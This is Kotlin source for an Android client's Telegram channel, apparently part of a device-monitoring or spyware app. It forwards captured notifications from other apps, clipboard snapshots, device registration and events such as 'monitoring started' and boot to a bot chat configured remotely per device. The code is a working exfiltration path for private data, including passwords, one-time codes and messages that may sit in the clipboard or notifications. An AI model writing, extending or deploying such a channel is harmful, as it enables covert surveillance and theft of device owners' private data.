package com.xeg911.appclient.data.remote.channel.telegram

import com.xeg911.appclient.core.device.DeviceIdentifier
import com.xeg911.appclient.data.remote.channel.telegram.format.TelegramMessage
import com.xeg911.appclient.data.remote.channel.telegram.format.TelegramMessageFactory
import com.xeg911.appclient.data.remote.config.NotificationFilterConfigRepository
import com.xeg911.shared.data.model.CapturedNotification
import com.xeg911.shared.data.model.ClipboardSnapshot
import com.xeg911.shared.data.model.DeviceRegistration
import com.xeg911.shared.data.model.event.DeviceEvent
import com.xeg911.shared.data.model.event.DeviceEventType
import com.xeg911.shared.data.remote.channel.RemoteChannel
import com.xeg911.shared.data.remote.channel.RemoteChannelIds
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class TelegramRemoteChannel @Inject constructor(
    private val configReader: TelegramConfigReader,
    private val api: TelegramApi,
    private val deviceIdentifier: DeviceIdentifier,
    private val filterConfigRepository: NotificationFilterConfigRepository,
) : RemoteChannel {

    override val channelId: String = RemoteChannelIds.TELEGRAM

    private val configMutex = Mutex()
    private var cachedConfig: TelegramBotConfig? = null
    private var cachedAt = 0L

    override suspend fun isEnabled(): Boolean = config().isReady

    override suspend fun registerDevice(registration: DeviceRegistration): Result<Unit> {
        val config = config(forceRefresh = true)
        if (!config.isReady) return Result.success(Unit)
        if (!registration.firstRegistration) return Result.success(Unit)
        return send(
            config = config,
            message = TelegramMessageFactory.buildDeviceRegisteredMessage(registration.deviceInfo)
        )
    }

    override suspend fun sendNotification(notification: CapturedNotification): Result<Unit> {
        val sourceDef = filterConfigRepository.sources.value.find { it.id == notification.source }
        return send(
            config = config(),
            message = TelegramMessageFactory.buildNotificationMessage(notification, sourceDef)
        )
    }

    override suspend fun sendClipboard(snapshot: ClipboardSnapshot): Result<Unit> {
        val deviceId = deviceIdentifier.resolveDeviceId()
        return send(config(), TelegramMessageFactory.buildClipboardMessage(snapshot, deviceId))
    }

    override suspend fun sendEvent(event: DeviceEvent): Result<Unit> {
        if (event.type !in FORWARDED_EVENTS) return Result.success(Unit)
        return send(config(), TelegramMessageFactory.buildEventMessage(event))
    }

    private suspend fun send(config: TelegramBotConfig, message: TelegramMessage): Result<Unit> {
        if (!config.isReady) return Result.success(Unit)
        return api.sendMessage(
            botToken = config.botToken,
            chatId = config.chatId,
            text = message.text,
            parseMode = message.parseMode,
            replyMarkup = message.replyMarkup,
        )
    }

    private suspend fun config(forceRefresh: Boolean = false): TelegramBotConfig =
        configMutex.withLock {
            val cached = cachedConfig
            val fresh = cached == null ||
                    forceRefresh ||
                    System.currentTimeMillis() - cachedAt > CONFIG_TTL_MS
            if (!fresh) return@withLock cached
            val deviceId = runCatching { deviceIdentifier.resolveDeviceId() }.getOrNull()
                ?: return@withLock cached ?: TelegramBotConfig()
            configReader.read(deviceId, TelegramConstants.CONFIG_NOTIFICATION).also {
                cachedConfig = it
                cachedAt = System.currentTimeMillis()
            }
        }

    private companion object {
        const val CONFIG_TTL_MS = 5 * 60_000L
        val FORWARDED_EVENTS = setOf(
            DeviceEventType.APP_OPENED,
            DeviceEventType.MONITORING_STARTED,
            DeviceEventType.BOOT_COMPLETED,
            DeviceEventType.PERMISSION_CHANGED,
        )
    }
}
